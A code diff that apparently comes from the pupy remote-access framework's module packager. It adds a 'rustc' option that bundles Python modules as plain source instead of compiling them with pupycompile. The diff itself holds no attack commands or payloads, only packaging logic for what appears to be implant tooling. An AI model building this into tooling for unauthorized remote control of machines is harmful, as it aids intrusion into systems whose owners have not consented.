@@ -53,15 +53,16 @@ class IgnoreFileException(Exception):
 class Target(object):
     __slots__ = (
         'os', 'arch', 'pymaj', 'pymin', 'debug',
-        '_native', '_so', '_platform'
+        '_native', '_so', '_platform', '_rustc'
     )
 
-    def __init__(self, python, platform=None, debug=False):
+    def __init__(self, python, platform=None, debug=False, rustc=False):
         self.pymaj, self.pymin = python[:2]
         self.debug = debug
 
         self.pymaj = int(self.pymaj)
         self.pymin = int(self.pymin)
+        self._rustc = rustc
 
         if platform:
             self.os, self.arch = platform[:2]
@@ -85,6 +86,10 @@ class Target(object):
     @property
     def native(self):
         return self._native
+
+    @property
+    def rustc(self):
+        return self._rustc
 
     @property
     def so(self):
@@ -507,39 +512,45 @@ def from_path(
                 base, ext = modpath.rsplit('.', 1)
 
                 # Garbage removing
-                if ext == 'py':
-                    try:
-                        module_code = pupycompile(
-                            module_code, modpath, target=target.pyver
-                        )
-                        modpath = base+'.pyo'
+                if target.rustc:
+                    if ext == 'py':
+                        modpath = base+'.py'
+                        if module_code is not None:
+                            modules_dic[modpath] = module_code
+                else:
+                    if ext == 'py':
+                        try:
+                            module_code = pupycompile(
+                                module_code, modpath, target=target.pyver
+                            )
+                            modpath = base+'.pyo'
+                            if base+'.pyc' in modules_dic:
+                                del modules_dic[base+'.pyc']
+                        except Exception as e:
+                            logger.error('Failed to compile %s: %s', modpath, e)
+
+                    elif ext == 'pyc':
+                        if base+'.pyo' in modules_dic:
+                            continue
+                    elif ext == 'pyo':
+                        if base+'.pyo' in modules_dic:
+                            continue
                         if base+'.pyc' in modules_dic:
                             del modules_dic[base+'.pyc']
-                    except Exception as e:
-                        logger.error('Failed to compile %s: %s', modpath, e)
 
-                elif ext == 'pyc':
-                    if base+'.pyo' in modules_dic:
-                        continue
-                elif ext == 'pyo':
-                    if base+'.pyo' in modules_dic:
-                        continue
-                    if base+'.pyc' in modules_dic:
-                        del modules_dic[base+'.pyc']
+                    # Special case with pyd loaders
+                    elif ext == 'pyd':
+                        if base+'.py' in modules_dic:
+                            del modules_dic[base+'.py']
 
-                # Special case with pyd loaders
-                elif ext == 'pyd':
-                    if base+'.py' in modules_dic:
-                        del modules_dic[base+'.py']
+                        if base+'.pyc' in modules_dic:
+                            del modules_dic[base+'.pyc']
 
-                    if base+'.pyc' in modules_dic:
-                        del modules_dic[base+'.pyc']
+                        if base+'.pyo' in modules_dic:
+                            del modules_dic[base+'.pyo']
 
-                    if base+'.pyo' in modules_dic:
-                        del modules_dic[base+'.pyo']
-
-                if module_code is not None:
-                    modules_dic[modpath] = module_code
+                    if module_code is not None:
+                        modules_dic[modpath] = module_code
 
     else:
         extlist = ['.py', '.pyo', '.pyc']
@@ -569,10 +580,13 @@ def from_path(
                     cur += rep + '/'
 
                 if ext == '.py':
-                    module_code = pupycompile(
-                        module_code, start_path+ext, target=target.pyver
-                    )
-                    ext = '.pyo'
+                    if target.rustc:
+                        ext = '.py'
+                    else:
+                        module_code = pupycompile(
+                            module_code, start_path+ext, target=target.pyver
+                        )
+                        ext = '.pyo'
 
                 modules_dic[start_path+ext] = module_code
 
@@ -707,7 +721,17 @@ def _package(
                         continue
 
                     # Garbage removing
-                    if ext == 'py':
+                    if target.rustc:
+                        if ext == "py":
+                            try:
+                                content = get_content(
+                                        target, prefix,
+                                        info.filename, archive,
+                                        honor_ignore=honor_ignore
+                                    )
+                            except IgnoreFileException:
+                                continue
+                    elif ext == 'py':
                         try:
                             content = pupycompile(
                                 get_content(
